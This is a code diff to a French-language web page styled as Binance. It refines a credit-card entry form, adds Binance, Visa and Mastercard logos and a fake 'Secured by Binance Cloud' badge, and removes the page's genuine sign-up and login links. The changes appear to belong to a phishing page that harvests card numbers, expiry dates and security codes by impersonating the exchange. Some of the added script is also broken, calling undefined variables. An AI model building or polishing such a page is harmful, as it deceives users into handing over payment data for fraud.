@@ -712,6 +712,11 @@
         </div>
     </div>
 </div>
+</div>
+<div class="mb-8">
+.        <h2>*****************************</h2>
+
+</div>
 <div class="mb-8">
 <style>
     /* Basic reset for this section */
@@ -784,10 +789,10 @@
         <div class="card-container">
             <div class="front">
                 <div class="image">
-                    <img src="https://pngimg.com/uploads/visa/visa_PNG36.png" alt="">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1158px-Mastercard-logo.svg.png" alt="" class="chip-img">
+                     <img src="https://pngimg.com/uploads/visa/visa_PNG36.png" alt="">
+                    <img src="https://crowmie.com/wp-content/uploads/2023/06/sec-binance.png" alt="" class="chip-img">
                 </div>
-                <div class="card-number" id="card-number-display">12345678901234</div>
+                <div class="card-number" id="card-number-display">•••• •••• •••• ••••</div>
                 <div class="flexbox">
                     <div class="box">
                         <span>Card Holder</span>
@@ -859,28 +864,40 @@
         </div>
     </div>
     <div class="bn-formItem mt-4"></div>
-    <button aria-label="Suivant" role="button" style="background-color:#fcd535;min-width:300px;min-height:48px;font-size:16px;" class="bn-button bn-button__primary data-size-large mt-6" style="width:100%">Suivant</button>
+    <button class="1" style="background-color:#fcd535;min-width:300px;min-height:48px;font-size:16px;" >Suivant</button>
 </form>
+        <div class="fofo">
+            <div class="payment-logos">
+                <img src="https://public.bnbstatic.com/20190405/eb2349c3-b2f8-4a93-a286-8f86a62ea9d8.png" alt="Binance" style="height: 35px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa" style="height: 35px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard" style="height: 35px;">
+            </div>
+            <p>🔒 Secured by Binance Cloud</p>
+        </div>
+
 		</div>
   
     </div>
 
 <script>
+
     // Function to update the card display in real-time
     function updateCardInfo() {
         // Update Card Holder Name
+		      
         const cardHolder = document.getElementById('owner').value;
         document.getElementById('card-holder-display').textContent = cardHolder || "Full Name";
 
         // Update Card Number with spacing (XXX XXXX XXXX XXXX format)
         let cardNumber = document.getElementById('cardNumber').value.replace(/\D/g, '').substring(0, 16);
         cardNumber = cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
-        document.getElementById('card-number-display').textContent = cardNumber || "########################";
+        document.getElementById('card-number-display').textContent = cardNumber || "•••• •••• •••• ••••";
 
         // Update Expiration Date (MM/YY format)
         let expDate = document.getElementById('expirationdate').value.replace(/\D/g, '').substring(0, 4);
         const month = expDate.substring(0, 2);
         const year = expDate.substring(2, 4);
+		detectCardType(value);
         document.getElementById('exp-month-display').textContent = month || "MM";
         document.getElementById('exp-year-display').textContent = year || "YY";
 
@@ -894,15 +911,45 @@
     document.getElementById('cardNumber').addEventListener('input', updateCardInfo);
     document.getElementById('expirationdate').addEventListener('input', updateCardInfo);
     document.getElementById('securitycode').addEventListener('input', updateCardInfo);
+	const cardLogo = document.getElementById('cardLogo');
+	        cardNumber.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+            let formatted = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formatted.substring(0, 19);
+            updateCardDisplay();
+            detectCardType(value);
+        });
 </script>
                          
 
 	<style>
 .credit-card-form {
     font-family: "Poppins", sans-serif;
+	
+	
+}
+      .fofo {
+            margin-top: 1.5rem;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #888;
+        }
+button.1 {
+    background-color: var(--primary-color);
+    color: #000;
+    padding: 15px;
+    border: none;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: bold;
+    cursor: pointer;
+    width: 100%;
+    transition: opacity 0.3s;
+    margin-top: 1rem;
 }
 
 .credit-card-form .container {
+
     height: 30vh;
     display: flex;
     align-items: center;
@@ -910,8 +957,33 @@
     flex-direction: column;
     background: #ddd;
 }
+        button {
+            background-color: var(--primary-color);
+            color: #000;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: opacity 0.3s;
+            margin-top: 1rem;
+        }
+        .card {
+            background: linear-gradient(45deg, rgba(0,0,0,0.6), rgba(0,0,0,0.3)),
+                        url('https://images.squarespace-cdn.com/content/v1/609701bc21f2ee5734517421/1642038232823-N6MW51E4C47LTNB52SFT/Gold+World+Cover+WM+new.jpg') center center / cover;
+            border-radius: 15px;
+            color: white;
+            position: relative;
+            height: 240px;
+            transform-style: preserve-3d;
+            transition: transform 0.6s;
+            overflow: hidden;
+        }
 
 .credit-card-form .container .card-container {
+
     position: relative;
     width: 400px;
     height: 250px;
@@ -921,6 +993,7 @@
 
 .credit-card-form .container .card-container .front,
 .credit-card-form .container .card-container .back {
+
     position: absolute;
     top: 0;
     left: 0;
@@ -934,6 +1007,8 @@
 }
 
 .credit-card-form .container .card-container .front {
+background: linear-gradient(45deg, rgba(0,0,0,0.6), rgba(0,0,0,0.3)),
+                        url('https://images.squarespace-cdn.com/content/v1/609701bc21f2ee5734517421/1642038232823-N6MW51E4C47LTNB52SFT/Gold+World+Cover+WM+new.jpg') center center / cover;
     transform: rotateY(0deg);
     display: flex;
     flex-direction: column;
@@ -941,6 +1016,8 @@
 }
 
 .credit-card-form .container .card-container .back {
+background: linear-gradient(45deg, rgba(0,0,0,0.6), rgba(0,0,0,0.3)),
+                        url('https://images.squarespace-cdn.com/content/v1/609701bc21f2ee5734517421/1642038232823-N6MW51E4C47LTNB52SFT/Gold+World+Cover+WM+new.jpg') center center / cover;
     transform: rotateY(180deg);
     text-align: right;
     display: flex;
@@ -1013,7 +1090,7 @@
         
               
                   </div>
-                  <div class="mb-8 mt-4 max-md:mt-6 typography-body3 text-[--color-SecondaryText]"><button aria-label="button" role="button" class="bn-button bn-button__text bn-button__text__yellow data-size-small !px-1 !min-w-min undefined" data-e2e="btn-sign-up-entity">Inscription en tant qu’entité</button> ou <button aria-label="button" role="button" class="bn-button bn-button__text bn-button__text__yellow data-size-small !px-1 !min-w-min undefined">Connexion</button></div>
+
                </div>
                <div></div>
             </main>
